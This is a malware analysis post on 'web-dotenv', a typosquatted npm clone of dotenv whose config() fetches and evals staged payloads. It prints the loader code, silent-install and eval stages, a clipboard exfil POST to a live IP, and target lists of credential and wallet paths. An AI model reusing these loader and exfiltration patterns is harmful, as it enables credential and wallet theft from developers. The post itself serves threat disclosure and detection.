---
title: "web-dotenv: a dotenv clone, plus one function that robs you"
date: 2026-05-26
summary: "A near-perfect copy of dotenv — 50M downloads a week — with one function bolted into config(), so booting your app fetches a stealer that combs $HOME for wallets and keys and watches your clipboard on a 750 ms loop."
packageName: web-dotenv
ecosystem: npm
---

`dotenv` is one of npm's most-installed packages — about 50M downloads a week. Four days ago a fresh gmail published `web-dotenv` (one prefix away), a near-byte-identical clone whose `package.json` still points `repository.url` at the upstream repo. The diff against `motdotla/dotenv` is one function and one call to it, both inside `lib/main.js`. The trigger is `config()` — what every consumer calls as `require('web-dotenv').config()` on application boot.

## Stage 1: the inserted function

A new top-level helper, and one call wedged into the first line of `config()`:

<pre class="lang-js"><code><span class="tok-kw">function</span> <span class="tok-fn">configfix</span>() {
  <span class="tok-builtin">require</span>(<span class="tok-str">'axios'</span>).<span class="tok-fn">get</span>(<span class="tok-fn">atob</span>(<span class="tok-str">'CWh0dHBzOi8vd3d3Lmpzb25rZWVwZXIuY29tL2IvVktVTkk='</span>))
    .<span class="tok-fn">then</span>(r =&gt; { <span class="tok-fn">eval</span>(r.data.content); });
}

<span class="tok-kw">function</span> <span class="tok-fn">config</span> (options) {
  <span class="tok-com">// fallback to fixed config</span>
  <span class="tok-fn">configfix</span>();
  ...
}
</code></pre>

The base64 has a leading tab — the only nod to obfuscation — and decodes to `\thttps://www.jsonkeeper.com/b/VKUNI`. The bin returns a JSON object whose `content` field is Stage 2's obfuscated JS, and `eval` runs it. There is no `postinstall` hook: the chain fires the first time any code path reaches `dotenv.config()`, so registry scanners and lockfile audits both see nothing. The author iterated visibly between versions:

- `1.0.0` (2026-05-22) inlined the entire Stage 2 obfuscator inside `configfix()`
- `1.0.2` (three days later) outsourced it to jsonkeeper for a smaller tarball and a mutable payload

| | Trait | What it caught |
| --- | --- | --- |
| <span class="sev-dot hostile" title="hostile"></span> | `supply-chain/install-hook/build/build-system-trojan` | `configfix()` injected into the upstream `dotenv` library init |
| <span class="sev-dot hostile" title="hostile"></span> | `command-and-control/remote-command/protocol/eval-http-response-data` | `eval(r.data.content)` on a fetched HTTP body |
| <span class="sev-dot suspicious" title="suspicious"></span> | `anti-static/obfuscation/encoding/content/malware` | `atob('CWh0dHBz…')` masking the Stage-2 URL |
| <span class="sev-dot suspicious" title="suspicious"></span> | `supply-chain/recon-exfil/npm-install-targeting` | Name-prefix lookalike of `dotenv` |

## Stage 2: the jsonkeeper loader

The bin is 19 KB of obfuscator.io output — a 237-entry string array and the standard array-rotation IIFE around an RC4-ish decoder. Stepped through in an instrumented sandbox it does exactly two things:

<pre class="lang-js"><code><span class="tok-fn">execSync</span>(
  <span class="tok-str">'npm install axios socket.io-client --no-warnings --no-save --no-progress --loglevel silent'</span>,
  { windowsHide: <span class="tok-kw">true</span>, cwd: os.<span class="tok-fn">tmpdir</span>() }
);

<span class="tok-fn">require</span>(<span class="tok-str">'axios'</span>).<span class="tok-fn">get</span>(
  <span class="tok-str">'http://216.126.224.247/api/service/329f753d052f978a486cdce9896050bb'</span>
).<span class="tok-fn">then</span>(r =&gt; <span class="tok-fn">eval</span>(r.data));
</code></pre>

The `--no-save` flag means the install touches neither the parent project's manifest nor its lockfile. The runtime deps land under `$TMPDIR/node_modules/` and Node finds them via parent-directory resolution from the next stage. The hex tail `329f753d052f978a486cdce9896050bb` is the campaign identifier and reappears as the `uid` field in every Stage-3 exfil packet. `socket.io-client` is pre-positioned but unused by Stage 3 as shipped — wiring for a later iteration.

| | Trait | What it caught |
| --- | --- | --- |
| <span class="sev-dot hostile" title="hostile"></span> | `command-and-control/remote-command/protocol/eval-http-response-data` | `eval` of HTTP body from a hardcoded IP |
| <span class="sev-dot suspicious" title="suspicious"></span> | `command-and-control/dropper/execution/network-stage/fetch-write-exec` | Silent `npm install` of runtime deps into `os.tmpdir()` before fetching Stage 3 |
| <span class="sev-dot suspicious" title="suspicious"></span> | `anti-static/obfuscation/tools/js-obfuscator/decoder-loop-keyword-triad` | Obfuscator.io string-array, decoder, and `while(!![])` rotation |
| <span class="sev-dot suspicious" title="suspicious"></span> | `command-and-control/infrastructure/ip-port` | `http://216.126.224.247/` hardcoded, no DNS |

## Stage 3: stealer + clipper

The body from `216.126.224.247` is 110 KB of the same obfuscator style. It writes two files to `os.tmpdir()` and detaches them:

<pre class="lang-js"><code>fs.<span class="tok-fn">writeFile</span>(path.<span class="tok-fn">join</span>(os.<span class="tok-fn">tmpdir</span>(), <span class="tok-str">'scdata'</span>), &lt;stealer&gt;);
fs.<span class="tok-fn">writeFile</span>(path.<span class="tok-fn">join</span>(os.<span class="tok-fn">tmpdir</span>(), <span class="tok-str">'ldata'</span>),  &lt;clipper&gt;);
<span class="tok-fn">exec</span>(<span class="tok-str">'node scdata'</span>, { cwd: os.<span class="tok-fn">tmpdir</span>(), windowsHide: <span class="tok-kw">true</span>, stdio: <span class="tok-str">'ignore'</span> });
<span class="tok-fn">exec</span>(<span class="tok-str">'node ldata'</span>,  { cwd: os.<span class="tok-fn">tmpdir</span>(), windowsHide: <span class="tok-kw">true</span>, stdio: <span class="tok-str">'ignore'</span> });
</code></pre>

Both files are also passed inline a second time as `node -e '<source>'` to a `spawn()` call — a belt-and-braces fallback if the on-disk write fails.

### `scdata` — the file stealer

`scdata` walks the user's home directory (and on Windows every drive reported by `Get-CimInstance Win32_LogicalDisk | Select-Object -ExpandProperty DeviceID`) for files matching:

- Wallet / crypto: `*metamask*`, `*bitcoin*`, `*btc*`, `*solana*`, `*private key*`, `*secret phrase*`, `*.dat`
- Secrets / config: `*.env*`, `*.pem`, `*.secret`, `*.key`, `*.json`, `*.yaml`, `*.yml`, `*.ini`, `*.sqlite`
- Documents: `*.pdf`, `*.docx`, `*.doc`, `*.xlsx`, `*.xls`, `*.csv`, `*.txt`, `*.md`, `*.rtf`, `*.odt`

…inside an allow-list of high-value directories. The list reads like 2026's dev surface — `.claude`, `.cursor`, `.windsurf`, `.pearai`, `.gemini`, `.eigent`, `.devctl` sit next to `.aws`, `.azure`, `.ssh`, `.gnupg`, `.docker`, and the Web3 workspaces `.brownie`, `.move`, `.sol`:

```
.aws  .azure  .ssh  .gnupg  .docker  .config  .cache
.cargo  .rustup  .cocoapods  .gemini  .claude  .cursor
.vscode  .vscode-server  .windsurf  .pearai  .vue-cli-ui
.brownie  .move  .sol  .eigent  .devctl  .pm2  .android
.steam  .snipaste  .yarn  .nvm  .node-gyp  .expo  .next
```

Each match is uploaded as `multipart/form-data` to `http://216.126.224.220:5976/upload`. Stage-3 control sits at `.247`, bulk exfil at `.220`, both inside the same Tier.Net `/22` (`216.126.224.0/22`).

### `ldata` — the clipboard watcher

`ldata` polls the clipboard every 750 ms and POSTs deltas back to the Stage-2 host. The read command depends on the platform:

- macOS: `pbpaste`
- Windows: `powershell -NoProfile -NonInteractive Get-Clipboard`

<pre class="lang-js"><code>axios.<span class="tok-fn">post</span>(<span class="tok-str">'http://216.126.224.247/npm-compiler.log'</span>, {
  message: clipboardText,
  host:    os.<span class="tok-fn">hostname</span>(),
  uid:     <span class="tok-str">'329f753d052f978a486cdce9896050bb'</span>,
  t:       <span class="tok-str">'102'</span>
});
</code></pre>

It is a watcher, not a swapper — the take is whatever the developer puts on the clipboard during the affected process's lifetime: secrets pasted from a password manager, copied wallet addresses, seed-phrase fragments. The exfil path `/npm-compiler.log` keeps the POST URL plausible at a glance.

| | Trait | What it caught |
| --- | --- | --- |
| <span class="sev-dot hostile" title="hostile"></span> | `command-and-control/dropper/execution/network-stage/obfuscated-node-staged-loader` | Obfuscator-decoded `require` + base64/XOR string decoders + `windowsHide`-via-expression spawn |
| <span class="sev-dot hostile" title="hostile"></span> | `command-and-control/dropper/execution/network-stage/spawn-node` | `node $TMPDIR/scdata` and `node $TMPDIR/ldata` detached |
| <span class="sev-dot hostile" title="hostile"></span> | `exfiltration/stealer/file/javascript/js-targeted-file-upload-exfil` | Sensitive-path filter → `216.126.224.220:5976/upload` multipart sink |
| <span class="sev-dot hostile" title="hostile"></span> | `exfiltration/stealer/credential/browser/javascript/js-browser-wallet-upload-exfil` | Wallet globs (`*metamask*`, `*solana*`, `*secret phrase*`) into an external-IP upload |
| <span class="sev-dot hostile" title="hostile"></span> | `exfiltration/stealer/credential/clipboard/javascript/js-clipboard-exfil-external-ip` | `pbpaste` + `powershell Get-Clipboard` polled every 750 ms, POSTed to a literal IPv4 |
| <span class="sev-dot suspicious" title="suspicious"></span> | `exfiltration/sensitive-data/javascript/js-system-info-exfiltration` | `Get-CimInstance Win32_LogicalDisk` drive enumeration sent to C2 |
| <span class="sev-dot suspicious" title="suspicious"></span> | `anti-static/obfuscation/payload/data-file/js-obfuscator-runtime-data-file` | `scdata` and `ldata` themselves: obfuscator loop + `decodeURIComponent` + `function c(b,d)` |
| <span class="sev-dot suspicious" title="suspicious"></span> | `evasion/masquerade/path/log` | Exfil URL named `/npm-compiler.log` |

## Why this works

`web-dotenv` ships 99% of `dotenv`'s source verbatim, and its diff is one function plus one call site. The trigger is runtime, not install: every prior post in this series detonated from `postinstall`, which every modern audit flags. This one fires the first time any consumer reaches `dotenv.config()` — much later, much harder to catch. Both downstream stages are paste-hosted, so the version pinned in any victim's lockfile is permanently fresh; the 1.0.0 → 1.0.2 diff already shows the author swapping the loader without bumping anything a consumer would notice.

## Likely actor

| Field | Value |
| --- | --- |
| Publisher | `jean_dupont24 <jean.pierre.depont24@gmail.com>` |
| Account created | `2026-05-22` |
| `1.0.0` published | `2026-05-22T14:15:09Z` |
| `1.0.2` published | `2026-05-25T15:05:35Z` |
| Campaign UID | `329f753d052f978a486cdce9896050bb` |
| Stage-2 host | `jsonkeeper.com/b/VKUNI` |
| Stage-3 host | `216.126.224.247` (Tier.Net Technologies LLC) |
| Bulk exfil host | `216.126.224.220:5976` (Tier.Net Technologies LLC) |

"Jean Dupont" is the French equivalent of "John Doe" — placeholder name, real gmail behind it. The technical signature differs from last week's `shinydv412` / `devcarron` cluster: those dropped a PE binary out of IPFS, this one is pure JavaScript, AI-tool–aware in its targeting list, and runtime-triggered rather than install-time. Different shop.

**Update (2026-05-28).** Two days after this post, [clx-cookieparser](/discoveries/2026/05/clx-cookieparser-dependency-twin-beavertail/) turned up running the identical endgame. It drops the same two-file stealer pair the same way, and ships the loot to the very same upload endpoint — `http://216.126.224.220:5976/upload`, byte-for-byte, not merely the same range. It reaches its loader through jsonkeeper.com and an `/api/service/<hex>` path on an adjacent Tier.Net address — web-dotenv's exact delivery shape. That package is attributed to the DPRK's Contagious Interview campaign (FAMOUS CHOLLIMA) by [dprk-research.kmsec.uk](https://dprk-research.kmsec.uk/). The shared sink is the tell: this is almost certainly the same operation, and `jean_dupont24` reads as a Contagious Interview persona rather than an independent actor. The "different shop" call above still holds against the IPFS PE cluster — but against BeaverTail and InvisibleFerret, it is the same shop.

The [Fallout report](https://lab.atomdrift.org/file/6401b9400fe94cc944d266fb39f1414e6e41a4c48317bd7a13d38df889f24ec6) returns malicious at probability 1.0.

## Indicators

| Type | Value |
| --- | --- |
| Package | `web-dotenv@1.0.2` (npm), also `1.0.0` |
| npm page | [npmjs.com/package/web-dotenv](https://www.npmjs.com/package/web-dotenv) |
| Tarball SHA-256 (1.0.2) | [`6401b9400fe94cc944d266fb39f1414e6e41a4c48317bd7a13d38df889f24ec6`](https://lab.atomdrift.org/file/6401b9400fe94cc944d266fb39f1414e6e41a4c48317bd7a13d38df889f24ec6) |
| Tarball SHA-256 (1.0.0) | [`c4f602914de9a106ab65300df233d0f15d29df19237ba3a70f2c86698e0b89c8`](https://lab.atomdrift.org/file/c4f602914de9a106ab65300df233d0f15d29df19237ba3a70f2c86698e0b89c8) |
| `lib/main.js` SHA-256 (1.0.2) | [`5cc30e2db46bb70e043b5f7fdb2d526caa2a4fcf83806c1c08bd6f0a1559ef43`](https://lab.atomdrift.org/file/5cc30e2db46bb70e043b5f7fdb2d526caa2a4fcf83806c1c08bd6f0a1559ef43) |
| Stage 2 URL | `https://www.jsonkeeper.com/b/VKUNI` (base64: `CWh0dHBzOi8vd3d3Lmpzb25rZWVwZXIuY29tL2IvVktVTkk=`) |
| Stage 2 SHA-256 (snapshot) | [`7e672968591f290c62892d51682432363cf33264f9c6a602088b9b93efbe70bf`](https://lab.atomdrift.org/file/7e672968591f290c62892d51682432363cf33264f9c6a602088b9b93efbe70bf) |
| Stage 3 URL | `http://216.126.224.247/api/service/329f753d052f978a486cdce9896050bb` |
| Stage 3 SHA-256 (snapshot) | [`bf97b9f78cbbed6e3b7af7240b4f1019d05496f138202262964f7d8a7271fe4f`](https://lab.atomdrift.org/file/bf97b9f78cbbed6e3b7af7240b4f1019d05496f138202262964f7d8a7271fe4f) |
| Dropped stealer | `$TMPDIR/scdata` (SHA-256 [`7c921e8acabce12825e12a7730912af63d0bed08700996b6e7389b9e96e1238b`](https://lab.atomdrift.org/file/7c921e8acabce12825e12a7730912af63d0bed08700996b6e7389b9e96e1238b)) |
| Dropped clipper | `$TMPDIR/ldata` (SHA-256 [`f3c3175bf05ccb6b97e371a451bba5a9d422aa7cfd6dbecb6f58c0cabfa6c5c1`](https://lab.atomdrift.org/file/f3c3175bf05ccb6b97e371a451bba5a9d422aa7cfd6dbecb6f58c0cabfa6c5c1)) |
| File exfil C2 | `http://216.126.224.220:5976/upload` (multipart) — identical endpoint reused by [clx-cookieparser](/discoveries/2026/05/clx-cookieparser-dependency-twin-beavertail/) (DPRK) |
| Clipboard exfil C2 | `http://216.126.224.247/npm-compiler.log` |
| Campaign UID | `329f753d052f978a486cdce9896050bb` |
| Publisher | `jean_dupont24 <jean.pierre.depont24@gmail.com>` |
